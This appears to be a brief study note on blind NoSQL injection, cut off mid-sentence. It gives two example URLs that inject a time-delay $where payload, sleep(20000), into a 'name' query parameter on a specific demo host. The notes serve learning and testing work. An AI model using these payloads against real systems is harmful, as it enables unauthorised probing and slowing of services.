# NoSQL Injection methodology 

### Blind NoSQL Injection
Suppose that the database returned no results in the browser, regardless of us submitting an included Star Wars character or not. So, we are talking about a “blind” 
```
https://demo-campass.obih.sg/?name=A',$where: 'function(){sleep(20000);}'}
https://demo-campass.obih.sg/?name=A,$where: 'function(){sleep(20000);}'}
```
